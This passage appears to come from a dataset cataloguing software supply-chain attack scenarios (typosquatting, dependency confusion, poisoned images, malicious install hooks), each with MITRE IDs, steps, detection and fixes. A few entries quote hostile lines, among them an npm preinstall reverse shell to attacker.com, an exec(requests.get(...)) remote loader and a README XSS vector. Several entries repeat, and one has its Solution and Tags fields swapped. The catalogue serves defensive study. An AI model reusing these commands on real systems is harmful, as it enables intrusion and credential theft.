- **Vulnerability**: Shared Docker layer misuse
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Persistent container compromise
- **Tools**: Docker, BuildKit, DockerHub
- **Scenario**: Attacker poisons shared Docker build cache used across teams by injecting backdoored binaries in pre-layered builds.
- **Attack Steps**: 1. Attacker gains access to a shared Docker build system or poisoned public base image used by multiple teams.2. They inject a malicious binary into the build cache layer (e.g., into /usr/local/bin/openssl).3. Docker layer caching causes other builds to reuse this poisoned layer silently.4. Every time another team builds a new container from the cached image, the malicious binary gets embedded.5. The binary activates at runtime or sends system info to attacker servers.6. Since layers are cached, no visible Dockerfile changes alert the dev team.7. Persistent access achieved across multiple services via invisible poisoning.
- **Detection**: Compare image hashes, monitor for unsigned binaries
- **Solution**: Use private trusted registries; don’t reuse public caches
- **Tags**: docker, buildkit, image poisoning, devsecops

## Compromising PyPI Mirror to Deliver Malicious Wheel Files

- **Attack Type**: Package Mirror Hijack
- **Target**: Python Dev Environments
- **Vulnerability**: Insecure internal mirrors
- **MITRE**: T1195 (Supply Chain Compromise)
- **Impact**: Mass developer workstation compromise
- **Tools**: PyPI, pip, mitmproxy
- **Scenario**: Attacker compromises a corporate or local PyPI mirror and serves altered .whl files with payloads during pip installs.
- **Attack Steps**: 1. The organization uses a PyPI mirror server to host a curated set of dependencies for internal devs.2. The attacker compromises this mirror through weak credentials or outdated software.3. They replace legitimate .whl files of common libraries (like requests) with versions containing malicious logic.4. Developers running pip install commands unknowingly fetch these backdoored packages.5. Malicious logic activates on import, exfiltrating AWS keys or injecting reverse shells.6. The attack remains stealthy as hashes are only validated against the compromised mirror.7. Malware spreads across multiple developer workstations.
- **Detection**: Hash validation, SSL inspection on internal mirrors
- **Solution**: Enforce hash pinning and TUF (The Update Framework) validation
- **Tags**: python, pypi, wheel, mirror attack, supply chain

## Hijacking Git Submodule to Insert Malicious Repo Reference

- **Attack Type**: Git Submodule Injection
- **Target**: Developer Environments
- **Vulnerability**: Trusting submodules without validation
- **MITRE**: T1195.002 (Third-Party Compromise)
- **Impact**: Silent execution of attacker logic at install time
- **Tools**: GitHub, Git, bash
- **Scenario**: Malicious actor modifies .gitmodules to reference attacker-controlled repo during clone/init.
- **Attack Steps**: 1. Attacker forks an open-source repo that includes a .gitmodules file referencing submodules.2. They change the submodule URL to point to a malicious repo under their control.3. The attacker submits a pull request or the forked repo is cloned by a dev without verifying submodules.4. On git clone --recurse-submodules, the malicious repo is fetched and may include install-time scripts.5. If the submodule contains pre/post-install hooks or CMake scripts, they execute upon project setup.6. The payload may install persistent access or data exfiltration logic.7. The attack spreads through trusted open-source usage.
- **Detection**: Monitor .gitmodules for unusual repo URLs
- **Solution**: Lock submodule URLs; use commit-specific SHA pinning
- **Tags**: git, submodule, open-source abuse, dependency

## Injecting Payload in CMake Preset via GitHub Fork

- **Attack Type**: Build Script Injection
- **Target**: Build Machines
- **Vulnerability**: CMake misuse in build presets
- **MITRE**: T1059 (Command & Script Execution)
- **Impact**: Code execution on trusted build infra
- **Tools**: GitHub, CMake, C2 Infra
- **Scenario**: Attacker poisons CMakePresets.json in an OSS repo with malicious build instructions.
- **Attack Steps**: 1. Attacker forks a C++ project that uses CMakePresets.json for standardizing builds.2. They inject a malicious command (e.g., reverse shell or file exfil) under buildPresets.3. They rename the preset to look legitimate (e.g., "build-linux-release").4. Devs cloning or testing the forked repo unknowingly run cmake --preset=build-linux-release.5. The attacker’s command executes during the CMake process, bypassing antivirus since it looks like a normal build.6. Payload establishes outbound connection or dumps secrets from the build machine.7. Attack stays undetected as presets aren’t often reviewed in PRs.
- **Detection**: Analyze CMakePresets.json during code review
- **Solution**: Enforce code review policies on all build scripts
- **Tags**: cmake, ci/cd, buildsystem, github fork

## Malicious Version Injection via Compromised Maintainer

- **Attack Type**: Insider Threat
- **Target**: All Developers
- **Vulnerability**: Insider threat, lack of auditing
- **MITRE**: T1195.002 (Trusted Relationship)
- **Impact**: Credential theft, brand reputation damage
- **Tools**: NPM, PyPI, obfuscator
- **Scenario**: A disgruntled maintainer of a widely used library publishes a new version with obfuscated malicious code.
- **Attack Steps**: 1. A popular open-source package maintainer adds a post-install obfuscated payload in a new release (e.g., v1.2.9).2. The malicious version includes code to steal browser cookies and send them to a hardcoded server.3. Due to the package’s popularity, many devs update to this version.4. The obfuscated logic avoids static scans using base64 + eval + string splitting.5. Users experience no issues, but sessions and credentials leak silently.6. Security teams take time to realize source of infection due to legitimate-seeming behavior.7. The attack causes widespread trust collapse in OSS.
- **Detection**: Monitor version diffs; alert on base64/eval in new versions
- **Solution**: Independent audits, enforce 2FA for maintainers
- **Tags**: npm, insider, obfuscated payload, version injection

## Fake Rust Crate Mimicking Crypto Library

- **Attack Type**: Typosquatting
- **Target**: Rust Devs
- **Vulnerability**: Name spoofing, crypto theft risk
- **MITRE**: T1195.002
- **Impact**: Direct crypto asset theft
- **Tools**: crates.io, Rust, VirusTotal
- **Scenario**: A malicious actor uploads a crate named crpyo-utils to mimic crypto-utils, injecting wallet-stealing code.
- **Attack Steps**: 1. Attacker uploads crpyo-utils, mimicking the legitimate crypto-utils used in crypto wallets.2. The malicious crate includes code that hooks into key signing and transaction building.3. Developers integrating this crate for fast prototyping unknowingly introduce backdoors.4. Upon transaction signing, the crate sends private keys or wallet seeds to the attacker.5. The attacker empties user wallets or signs unauthorized transactions.6. Detection is delayed as code looks standard.7. The malicious crate is reported after damage is done.
- **Detection**: Monitor new crate names; detect typosquats
- **Solution**: Encourage dependency allow-listing and digital signatures
- **Tags**: rust, crypto, typosquat, crates.io

## Dependency Confusion via Unscoped Internal NPM Package

- **Attack Type**: Dependency Confusion
- **Target**: JavaScript CI/CD
- **Vulnerability**: Improper scoping, unscoped package usage
- **MITRE**: T1195.002
- **Impact**: Build compromise, secrets theft
- **Tools**: npm, whoisxml, burp
- **Scenario**: Attacker registers unscoped NPM package matching internal module name to hijack builds.
- **Attack Steps**: 1. Organization internally uses a package named config-handler with no npm scope (@org/config-handler).2. Attacker discovers this name by reviewing error logs, .lock files, or via DNS leaks.3. They register a public package named config-handler on NPM.4. Internal builds that lack strict scoping or lockfiles pull this public package.5. The attacker’s version contains a malicious payload in its install script.6. On CI/CD build, the payload activates, allowing reverse shell, AWS key exfil, or tampering with configs.7. The compromise spreads to downstream apps.
- **Detection**: Enforce NPM scopes and lockfiles; review package.json
- **Solution**: npm, dependency confusion, scoping, javascript
- **Tags**: Veracode

## Altering Composer Dependencies via Public Fork Injection

- **Attack Type**: PHP Ecosystem Abuse
- **Target**: PHP Web Apps
- **Vulnerability**: Satis misconfiguration, trust assumption
- **MITRE**: T1195 (Supply Chain Compromise)
- **Impact**: Persistent backdoor via PHP autoload
- **Tools**: Composer, PHP, satis
- **Scenario**: Attacker modifies PHP library fork and tricks composer to resolve it via satis/misconfig.
- **Attack Steps**: 1. A PHP dev uses a satis private repo for composer-based dependency resolution.2. Attacker forks a widely used package and changes logic in autoload.php.3. Due to a satis misconfiguration, the attacker’s forked repo gets included in resolution.4. When the dev runs composer install, it pulls the backdoored repo.5. The malicious autoload.php includes a persistent reverse shell.6. Backdoor activates whenever the web app loads.7. No one notices due to satis listing the fork as a “mirror.”
- **Detection**: Compare checksums, enforce Git source pinning
- **Solution**: Use hash pinning; validate satis source mappings
- **Tags**: php, composer, satis, mirror confusion

## Reverse Shell in Terraform Provider Published to Registry

- **Attack Type**: Provider Abuse
- **Target**: Terraform Pipelines
- **Vulnerability**: Fake provider abuse, poor validation
- **MITRE**: T1195.002
- **Impact**: Cloud infra access, pipeline compromise
- **Tools**: Terraform, HCL, ngrok
- **Scenario**: Attacker publishes Terraform provider with embedded reverse shell under fake namespace.
- **Attack Steps**: 1. Attacker creates a new provider with name similar to popular ones (e.g., awsplus vs aws).2. Publishes it to the Terraform Registry.3. The provider includes a shell command in resource initialization logic.4. Infra teams experimenting with new modules include it in testing pipelines.5. On execution, the reverse shell connects to attacker’s ngrok listener.6. The attacker gains access to build agents or provisioning environments.7. Misuse leads to full environment compromise and infra leakage.
- **Detection**: Monitor Terraform providers for suspicious logic
- **Solution**: Use verified providers only; scan provider source code
- **Tags**: terraform, hcl, reverse shell, fake module

## Reverse Shell in Terraform Provider Published to Registry

- **Attack Type**: Provider Abuse
- **Target**: Terraform Pipelines
- **Vulnerability**: Fake provider abuse, poor validation
- **MITRE**: T1195.002
- **Impact**: Cloud infra access, pipeline compromise
- **Tools**: Terraform, HCL, ngrok
- **Scenario**: Attacker publishes Terraform provider with embedded reverse shell under fake namespace.
- **Attack Steps**: 1. Attacker creates a new provider with name similar to popular ones (e.g., awsplus vs aws).2. Publishes it to the Terraform Registry.3. The provider includes a shell command in resource initialization logic.4. Infra teams experimenting with new modules include it in testing pipelines.5. On execution, the reverse shell connects to attacker’s ngrok listener.6. The attacker gains access to build agents or provisioning environments.7. Misuse leads to full environment compromise and infra leakage.
- **Detection**: Monitor Terraform providers for suspicious logic
- **Solution**: Use verified providers only; scan provider source code
- **Tags**: terraform, hcl, reverse shell, fake module

## Hijacking Internal Python Package Registry

- **Attack Type**: Internal Repo Hijack
- **Target**: Internal Dev Team
- **Vulnerability**: Misconfigured Internal Package Registry
- **MITRE**: T1557 / T1195.002
- **Impact**: Code execution during CI runs; potential lateral movement
- **Tools**: twine, devpi, mitmproxy
- **Scenario**: A private Python package is accidentally exposed by misconfigured registry access, allowing an attacker to overwrite it with a backdoored version in an internal repository.
- **Attack Steps**: 1. Attacker finds a company hosting internal Python packages using devpi. 2. Discovers that the internal registry allows unauthenticated uploads due to misconfiguration. 3. Attacker creates a backdoored version of an internal package and uses twine upload to publish it. 4. Developer unknowingly installs the poisoned package from the internal repo. 5. Malicious code executes in CI/CD pipeline, allowing lateral movement or exfiltration of secrets.
- **Detection**: Monitor access logs to internal registries; compare hashes of package versions
- **Solution**: Secure internal repos with auth & access controls; enforce package signing
- **Tags**: #Python #InternalRepo #CI/CD #PrivEsc #SupplyChain

## Supply Chain Attack via NuGet Pre/Post Build Events

- **Attack Type**: Build Script Injection
- **Target**: Developers
- **Vulnerability**: Abuse of pre/post build hooks in NuGet
- **MITRE**: T1129 / T1553.006
- **Impact**: Remote execution via build chain
- **Tools**: NuGet, Visual Studio, ProcMon
- **Scenario**: Attacker sneaks malicious commands into the pre-build or post-build scripts of a NuGet package, which automatically executes when installed by Visual Studio or MSBuild.
- **Attack Steps**: 1. Attacker creates a NuGet package with innocent-looking code but embeds malicious PowerShell in the Install.ps1 file or adds commands in .nuspec that trigger on install. 2. Publishes it to NuGet.org with a misleading name similar to a real package. 3. A developer unknowingly installs it via Visual Studio. 4. Pre-build script silently runs malicious code (e.g., creates reverse shell, steals credentials). 5. System is compromised as part of developer environment or CI server.
- **Detection**: Monitor execution of install scripts; inspect .nuspec and Install.ps1 files
- **Solution**: Disable script execution from NuGet; use signed packages
- **Tags**: #NuGet #DotNet #BuildHijack #CI #SupplyChain

## Typo-squatting on Internal NPM Namespace

- **Attack Type**: Internal Typo-squatting
- **Target**: Developers/CI
- **Vulnerability**: Typo namespace trust in NPM
- **MITRE**: T1195.002 / T1557
- **Impact**: Full compromise of build system or developer machine
- **Tools**: NPM CLI, npq, typosquatting tools
- **Scenario**: A company uses an internal namespace for private packages (@acme/utils), but a public attacker publishes a similarly named package (@acmecorp/utils) in the public NPM registry to trick internal tooling.
- **Attack Steps**: 1. Attacker analyzes the target company's job postings or GitHub repos to identify naming patterns (e.g., @acme/). 2. Registers a similar-looking public package like @acmecorp/utils. 3. Adds harmless-looking but malicious code in the main entrypoint. 4. A distracted developer mistypes the namespace or autocomplete uses the public version. 5. The package installs and executes malicious logic during build, compromising developer machines or CI pipeline.
- **Detection**: Check package source (public vs private); monitor logs for unexpected namespace usage
- **Solution**: Enforce strict scoping policies for NPM; block external namespace resolution
- **Tags**: #TypoSquatting #NPM #NamespaceAbuse #DevSecOps

## Subverting Git Hooks in Third-Party Packages

- **Attack Type**: Git Hook Injection
- **Target**: Developers
- **Vulnerability**: Insecure Git Hook Handling
- **MITRE**: T1059 / T1204
- **Impact**: Local data exfiltration from dev environment
- **Tools**: Git, Git hooks, bash
- **Scenario**: Attacker includes a malicious preinstall Git hook within a shared third-party repo. When the victim pulls or installs the repo, the hook executes in the local environment.
- **Attack Steps**: 1. Attacker forks a popular open-source package and injects a malicious .git/hooks/pre-commit file that includes data exfiltration code. 2. Pushes the repo to GitHub. 3. Developer installs the package via Git clone or uses it as a submodule. 4. During install or commit, the Git hook triggers and executes attacker code. 5. Credentials or tokens are exfiltrated silently.
- **Detection**: Monitor .git/hooks during install; audit installed Git packages
- **Solution**: Block unknown Git hooks in dev environments; disable execution or enforce custom policies
- **Tags**: #GitHooks #PreInstall #DataExfil #DevEnvironment

## Abuse of Composer Post-Install Hooks

- **Attack Type**: PHP Dependency Execution
- **Target**: PHP Projects
- **Vulnerability**: Unsanitized composer hooks
- **MITRE**: T1129 / T1557.001
- **Impact**: Remote access, sensitive data theft
- **Tools**: Composer, PHP, Wireshark
- **Scenario**: Malicious PHP package abuses post-install-cmd in Composer to run arbitrary code after install, affecting Laravel or Symfony projects.
- **Attack Steps**: 1. Attacker creates a PHP package with seemingly benign purpose. 2. Adds a malicious payload in the composer.json under scripts → post-install-cmd. 3. Uploads it to Packagist or tricks user into using it via GitHub. 4. When the user installs it via Composer, the payload runs and may perform RCE or key theft. 5. Attacker now has a foothold into the system running the PHP backend or CI system.
- **Detection**: Monitor composer install logs; validate hook contents
- **Solution**: Disable Composer hook execution during install; only allow known packages
- **Tags**: #PHP #Composer #PostInstall #HookAbuse

## Supply Chain Attack via Alpine Base Image Poisoning

- **Attack Type**: Container Image Poisoning
- **Target**: CI Pipelines
- **Vulnerability**: Loose Docker tag policies
- **MITRE**: T1204.003 / T1036.005
- **Impact**: Resource abuse; covert crypto mining
- **Tools**: Docker, Trivy, Docker Hub
- **Scenario**: Attacker uploads a malicious Alpine Linux image to Docker Hub with similar tags, which is pulled by build pipelines expecting the original.
- **Attack Steps**: 1. Attacker creates a fake Alpine image (e.g., alpine-secure) that mimics the original but has a crypto miner inside the /etc/profile. 2. Tags it similarly to popular versions (e.g., 3.18-alpine). 3. CI pipeline with broad tag matching pulls this fake image during a Docker build. 4. As containers run, the crypto miner is automatically executed in every new build environment. 5. Leads to resource hijacking and system slowdown.
- **Detection**: Image scanning using tools like Trivy; hash verification
- **Solution**: Pin Docker image tags explicitly; use signed images
- **Tags**: #Docker #Alpine #ImagePoisoning #CryptoMining

## Compromise via Malicious GitHub Action Marketplace

- **Attack Type**: CI Workflow Compromise
- **Target**: DevOps Pipelines
- **Vulnerability**: Trust in third-party GitHub Actions
- **MITRE**: T1195 / T1557.002
- **Impact**: Credential theft from CI/CD environments
- **Tools**: GitHub Actions, Actions Toolkit
- **Scenario**: Attacker submits a malicious GitHub Action to the public Marketplace that exfiltrates secrets from workflows that use it.
- **Attack Steps**: 1. Attacker creates a GitHub Action that appears useful (e.g., linting, test runner). 2. Uploads it to the Marketplace with proper branding and README. 3. Embeds secret-stealing logic into the entrypoint script. 4. DevOps engineer adds this Action into their workflow (e.g., .github/workflows/main.yml). 5. On execution, secrets like GITHUB_TOKEN or AWS credentials are harvested. 6. Attacker receives secrets via webhook or remote server.
- **Detection**: Monitor network traffic from Actions; validate Action authors
- **Solution**: Use GitHub Actions from verified publishers only
- **Tags**: #GitHubActions #CI #Marketplace #SecretTheft

## JavaScript Payloads in Markdown via Readme Injection

- **Attack Type**: Dev Portal Social Attack
- **Target**: Developers
- **Vulnerability**: Unsafe rendering of untrusted README files
- **MITRE**: T1189 / T1059
- **Impact**: Dev-side compromise, browser-level access
- **Tools**: NPM, Markdown Viewer, VSCode
- **Scenario**: Malicious code is embedded in a package’s README.md, which auto-renders in developer portals or VSCode, triggering malicious JS via embedded links or XSS.
- **Attack Steps**: 1. Attacker publishes a popular-sounding NPM package with a README containing a <img src="javascript:..."> payload or similar XSS vector. 2. When the README auto-renders in dev portals like GitHub or VSCode, the JS is executed. 3. The script steals clipboard, local IPs, or session cookies depending on the viewer. 4. The attack targets developers directly through package documentation. 5. Could lead to account takeover or further internal compromise.
- **Detection**: Filter unsafe markdown rendering; restrict execution contexts
- **Solution**: Strip dangerous HTML from markdowns; sandbox documentation viewers
- **Tags**: #NPM #XSS #ReadmeAttack #DevPortal

## Shadow Banning Legitimate Packages via Registry Poisoning

- **Attack Type**: Registry Abuse
- **Target**: Developers
- **Vulnerability**: Registry lacks spam filter / search ranking
- **MITRE**: T1205 / T1195.002
- **Impact**: Users download malicious clones
- **Tools**: NPM, PyPI, SEO Tools
- **Scenario**: Attacker publishes hundreds of junk versions of a legitimate package under similar names, pushing down visibility of the original in search results.
- **Attack Steps**: 1. Attacker identifies a target package (e.g., lodash) and creates dozens of clones with names like lodashx, lodas-h, lodah3. 2. Uses bots to give them stars, installs, and SEO-optimized READMEs. 3. These packages push down the real one in registry search results. 4. New developers might choose one of these shadow packages instead. 5. Each clone contains telemetry tracking or malware.
- **Detection**: Monitor registry for clone explosion; use package popularity metrics
- **Solution**: Improve package registries’ spam filters; flag clones
- **Tags**: #RegistryPoisoning #SearchHijack #MalwareClones

## PyPI Attack via Multi-stage Setup.py Loader

- **Attack Type**: Multi-Stage Obfuscation
- **Target**: Python Users
- **Vulnerability**: Remote payload fetch in setup.py
- **MITRE**: T1203 / T1129
- **Impact**: Hard-to-detect RCE at install time
- **Tools**: PyPI, setup.py, Obfuscator.io
- **Scenario**: A Python attacker embeds a small loader in setup.py that pulls an external, obfuscated second-stage payload to avoid static detection.
- **Attack Steps**: 1. Attacker creates a PyPI package with a nearly empty codebase and a small setup.py file. 2. The setup.py includes an exec(requests.get(...).text) line to fetch and run a remote obfuscated script. 3. User installs the package and setup.py runs during pip install. 4. Remote script performs actual malicious operations like system scan or keylogging. 5. First-stage script is benign looking, allowing it to pass through automated static scanners.
- **Detection**: Monitor setup.py for dynamic code; block outbound calls during install
- **Solution**: Ban remote execution in setup files; validate packages before install
- **Tags**: #PyPI #SetupLoader #Obfuscation #TwoStagePayloads

## PyPI Attack via Multi-stage Setup.py Loader

- **Attack Type**: Multi-Stage Obfuscation
- **Target**: Python Users
- **Vulnerability**: Remote payload fetch in setup.py
- **MITRE**: T1203 / T1129
- **Impact**: Hard-to-detect RCE at install time
- **Tools**: PyPI, setup.py, Obfuscator.io
- **Scenario**: A Python attacker embeds a small loader in setup.py that pulls an external, obfuscated second-stage payload to avoid static detection.
- **Attack Steps**: 1. Attacker creates a PyPI package with a nearly empty codebase and a small setup.py file. 2. The setup.py includes an exec(requests.get(...).text) line to fetch and run a remote obfuscated script. 3. User installs the package and setup.py runs during pip install. 4. Remote script performs actual malicious operations like system scan or keylogging. 5. First-stage script is benign looking, allowing it to pass through automated static scanners.
- **Detection**: Monitor setup.py for dynamic code; block outbound calls during install
- **Solution**: Ban remote execution in setup files; validate packages before install
- **Tags**: #PyPI #SetupLoader #Obfuscation #TwoStagePayloads

## Compromising a Dev Dependency in a Closed Git Repo

- **Attack Type**: Internal Dependency Injection
- **Target**: Internal Codebase
- **Vulnerability**: Lack of version pinning & code audit
- **MITRE**: T1195.002 - Supply Chain Compromise
- **Impact**: Data exfiltration and potential lateral movement via poisoned internal components
- **Tools**: Git, VSCode, Node.js
- **Scenario**: An attacker injects a malicious update into a proprietary JavaScript library that is version-controlled internally and reused across several company projects.
- **Attack Steps**: 1. Attacker gains access to internal Git server via leaked credentials or insider access.2. Modifies a shared JS utility repo to include obfuscated malicious code that triggers during string processing.3. Pushes changes and updates version.4. Downstream microservices automatically pull the latest version due to CI/CD auto-pull setup.5. When microservices run in production, malicious code sends internal metadata to attacker’s domain.
- **Detection**: Internal code integrity checks, Git webhook alerts
- **Solution**: Implement strict code review on internal dependencies and isolate version updates
- **Tags**: #Internal #Git #DevDependency #JS #CodeInjection

## Malicious Update of Obsolete Python Package

- **Attack Type**: Dependency Takeover
- **Target**: Public Repositories
- **Vulnerability**: Abandoned packages & metadata control
- **MITRE**: T1195.002
- **Impact**: Stolen environment credentials, SSH keys, or tokens
- **Tools**: PyPi, pip, Whois, Python
- **Scenario**: An abandoned Python package is taken over by a malicious actor and updated with spyware in the guise of maintenance.
- **Attack Steps**: 1. Attacker finds an abandoned PyPI package with expired domain in metadata.2. Registers the domain and claims package ownership.3. Publishes a new version (e.g., 1.0.5) with tracking code embedded inside commonly used functions.4. Unsuspecting developers pull this version via pip install.5. Upon execution, it logs environment variables and sends to C2.6. Logs are disguised as “telemetry for performance monitoring.”
- **Detection**: Monitor version spikes and ownership changes on PyPI
- **Solution**: Audit and mirror essential packages; avoid using abandoned/unmaintained dependencies
- **Tags**: #Python #PyPI #Abandonment #PackageHijack

## Signed Malicious NPM Binary with Valid Developer Cert

- **Attack Type**: Signed Binary Abuse
- **Target**: Public Packages
- **Vulnerability**: Misuse of trust in signed packages
- **MITRE**: T1553.002
- **Impact**: Trust violation and persistent data theft in Dev environments
- **Tools**: NPM, OpenSSL, CodeSignTools
- **Scenario**: Attacker uses a stolen developer code-signing cert to publish a malicious Node.js binary in a commonly used utility library.
- **Attack Steps**: 1. Attacker steals or purchases a leaked code-signing certificate from a breached org.2. Injects data exfiltration code into a Node.js binary used in a CLI utility.3. Signs the binary with the stolen cert.4. Publishes to NPM registry with a new major version.5. Due to the valid signature, the package passes some CI/CD validations.6. Upon execution, it gathers git commit history and SSH config data and uploads silently.
- **Detection**: Detect anomalies in signed binaries; verify signatures
- **Solution**: Use known publisher allowlists; revoke leaked certs quickly
- **Tags**: #NPM #SignedBinary #CertTheft #SupplyChain

## Tampering in DockerHub Image of CLI Tool

- **Attack Type**: Image-Based Supply Chain Attack
- **Target**: Containers
- **Vulnerability**: CI/CD pulling unverified latest tags
- **MITRE**: T1195.002
- **Impact**: Remote shell on internal build containers
- **Tools**: DockerHub, nc, bash
- **Scenario**: The official image of a CLI tool hosted on DockerHub is hijacked with a new build containing a reverse shell.
- **Attack Steps**: 1. Attacker gains DockerHub credentials of the maintainer via phishing.2. Rebuilds CLI image to include a reverse shell (bash -i >& /dev/tcp/...).3. Pushes updated image with minor version bump.4. CI pipelines pulling “latest” or floating tags unknowingly run compromised image.5. Upon execution, reverse shell establishes outbound connection to attacker’s netcat listener.6. Attacker gains access to build container and environment.
- **Detection**: Monitor new image layers and origin audit logs
- **Solution**: Pin image digests and scan every build for backdoors
- **Tags**: #Docker #ReverseShell #CLI #ImageHijack

## Injecting Malicious .jar in Public Maven Repo

- **Attack Type**: Malicious Java Archive Injection
- **Target**: Java Dev Envs
- **Vulnerability**: Naming ambiguity & implicit trust
- **MITRE**: T1554
- **Impact**: JVM-based backdoors and telemetry leaks
- **Tools**: Maven, javap, curl
- **Scenario**: Attacker uploads a poisoned version of a utility .jar to Maven Central, mimicking the name of a common open-source lib.
- **Attack Steps**: 1. Attacker registers a new .jar library like fast-utils-core resembling fastutil.2. Inside the .jar, a static block executes on import and sends OS info.3. Promotes this package through GitHub SEO and Reddit forums.4. Java developers unknowingly include it.5. At runtime, data gets exfiltrated on JVM classload time.6. Exploits class initialization behaviors to hide payload.
- **Detection**: Java class inspection tools and .jar scanners
- **Solution**: Only use vetted and pinned Maven artifacts; verify hash
- **Tags**: #Java #Maven #JARBackdoor #FakeLibs

## Preinstall Script Backdoor in NPM Package

- **Attack Type**: Preinstall Script Exploitation
- **Target**: Dev Machines
- **Vulnerability**: Preinstall script abuse in NPM
- **MITRE**: T1204.002
- **Impact**: Full compromise of dev machines or runners
- **Tools**: NPM, reverse shell, bash
- **Scenario**: Malicious actor adds a preinstall script in package.json that opens a reverse shell during npm install.
- **Attack Steps**: 1. Attacker publishes a new version of a package with preinstall script:"preinstall": "bash -i >& /dev/tcp/attacker.com/9001 0>&1".2. Script is executed automatically during installation.3. Developers testing locally or during build trigger the script unknowingly.4. Reverse shell connects to attacker's server.5. Attacker gains remote access to developer machine or CI build node.6. Can now pivot internally or exfiltrate secrets from local .env files.
- **Detection**: Monitor install hooks in package.json during CI builds
- **Solution**: Disable script execution or require approvals in CI pipelines
- **Tags**: #NPM #Preinstall #Backdoor #ReverseShell

## Tampered Zip Dependency via PyPi with Steganography Payload

- **Attack Type**: Archive Payload Obfuscation
- **Target**: PyPI Users
- **Vulnerability**: Stealthy payloads & hidden execution
- **MITRE**: T1204.002
- **Impact**: Hard-to-detect post-install persistence
- **Tools**: PyPI, steghide, Python
- **Scenario**: A zipped Python dependency on PyPI hides a steganographic payload inside an image, later extracted and executed post-install.
- **Attack Steps**: 1. Malicious actor uploads a .zip package to PyPI containing images and Python files.2. One image (e.g., logo.png) contains base64-encoded Python backdoor via steganography.3. The main script extracts this payload post-install using steghide or PIL + decoding.4. Payload runs in background as daemon, tracking file activity.5. Difficult to detect as no code is clearly visible upfront.6. Infection persists across sessions due to background task scheduling.
- **Detection**: Analyze package contents for non-code anomalies
- **Solution**: Disallow zipped packages or enforce unzip and scan policies
- **Tags**: #Python #ZipBackdoor #StegoPayload #Obfuscation

## Forked Repo of Popular Lib with Malicious Typo

- **Attack Type**: Typosquatting
- **Target**: PyPI Users
- **Vulnerability**: Typosquatting & setup script abuse
- **MITRE**: T1555.003
- **Impact**: Exfiltration of host environment metadata during install
- **Tools**: PyPI, GitHub, diff tool
- **Scenario**: A malicious fork of a popular GitHub repo is uploaded to PyPI with a subtly mistyped name and backdoor added in setup script.
- **Attack Steps**: 1. Attacker forks a real library like flask-utils.2. Makes subtle change in repo name to flask_utilz.3. Adds malicious payload in setup.py that logs local IP, OS info and sends to remote server.4. Uploads to PyPI and promotes via online tutorials and SEO.5. Developers searching quickly install using typo’d name.6. Payload runs during install and exfiltrates data.
- **Detection**: Monitor new packages similar to popular ones
- **Solution**: Package name filtering, install allowlists, and security-aware IDE warnings
- **Tags**: #PyPI #Typosquatting #SetupPy #Exfiltration

## Dependency Confusion via Private Go Module Name

- **Attack Type**: Go Module Namespace Conflict
- **Target**: Golang CI Systems
- **Vulnerability**: Improper internal module isolation
- **MITRE**: T1195.002
- **Impact**: C2 access to Go build systems
- **Tools**: Go Modules, MITMproxy
- **Scenario**: Attacker registers a Go module in public with the same name as an internal company module.
- **Attack Steps**: 1. Attacker guesses internal Go module path (e.g., corp.internal/util/logs).2. Registers the exact name publicly on Go module proxy.3. Adds code that logs GOPATH, filepaths, and opens C2 socket.4. Developer’s build system, due to misconfiguration, resolves via public module proxy.5. The malicious module gets fetched and built.6. Backdoor executes during init and remains unnoticed in logs.
- **Detection**: Monitor Go build logs and unexpected external resolutions
- **Solution**: Use replace directives in go.mod for internal modules
- **Tags**: #Golang #DependencyConfusion #GoProxy

## Embedded Crypto Miner in Python Scientific Package

- **Attack Type**: Crypto Mining Abuse
- **Target**: Python Users
- **Vulnerability**: Obfuscated compute resource abuse
- **MITRE**: T1496
- **Impact**: System slowdowns, unauthorized compute resource consumption
- **Tools**: Python, Monero Miner
- **Scenario**: A forked copy of a scientific computing package like numexpr is published with embedded Monero miner under obfuscated code block.
- **Attack Steps**: 1. Attacker forks numexpr and modifies source to embed CPU miner logic under if __debug__ block.2. Uploads to PyPI with similar name (numexpre or numexpr2).3. Once installed, miner runs silently in background.4. High CPU usage seen during imports.5. Generates Monero to attacker's wallet during idle CPU cycles.6. Detection is difficult due to masked thread names and low process priority.
- **Detection**: Monitor CPU usage spikes post package install
- **Solution**: Review all packages that require native extensions or high resource use
- **Tags**: #Python #CryptoMining #ObfuscatedCode #PackageFork

## Embedded Crypto Miner in Python Scientific Package

- **Attack Type**: Crypto Mining Abuse
- **Target**: Python Users
- **Vulnerability**: Obfuscated compute resource abuse
- **MITRE**: T1496
- **Impact**: System slowdowns, unauthorized compute resource consumption
- **Tools**: Python, Monero Miner
- **Scenario**: A forked copy of a scientific computing package like numexpr is published with embedded Monero miner under obfuscated code block.
- **Attack Steps**: 1. Attacker forks numexpr and modifies source to embed CPU miner logic under if __debug__ block.2. Uploads to PyPI with similar name (numexpre or numexpr2).3. Once installed, miner runs silently in background.4. High CPU usage seen during imports.5. Generates Monero to attacker's wallet during idle CPU cycles.6. Detection is difficult due to masked thread names and low process priority.
- **Detection**: Monitor CPU usage spikes post package install
- **Solution**: Review all packages that require native extensions or high resource use
- **Tags**: #Python #CryptoMining #ObfuscatedCode #PackageFork

## Dependency Confusion via Forgotten Scoped Package

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipelines
- **Vulnerability**: Insecure package resolution configuration
- **MITRE**: T1195.001 (Supply Chain Compromise)
- **Impact**: Sensitive data exfiltration or backdoor in internal tooling pipeline
- **Tools**: npm, GitHub Actions
- **Scenario**: Attacker registers a scoped NPM package (@org/internal-tool) that was used internally in a private repo but never published, causing CI/CD to pull the public one.
- **Attack Steps**: 1. Discover an internal scoped package name used in CI logs (e.g., @org/internal-tool).2. Check npm registry — the scoped package is not published.3. Create a malicious version with the same name and publish it to the public npm registry.4. Victim’s CI/CD pipeline, using default npm config, resolves it to the public malicious version.5. Payload runs during build (e.g., exfiltrates AWS creds via script).6. Attacker receives sensitive data or gains access.
- **Detection**: Monitor unexpected downloads from public package registry
- **Solution**: Use strict npmscoping and internal registry lock
- **Tags**: npm, dependency confusion, CI/CD, internal packages

## Typosquatting Critical Terraform Provider Module

- **Attack Type**: Malicious Libraries
- **Target**: Infra-as-Code
- **Vulnerability**: Lack of module source validation in Terraform configs
- **MITRE**: T1195.002 (Compromise Software Supply Chain)
- **Impact**: Remote code execution during infrastructure provisioning
- **Tools**: Terraform Registry, Go, curl
- **Scenario**: Attacker uploads a malicious module mimicking a popular Terraform module, such as terraform-google-loadblancer, exploiting typos in spelling.
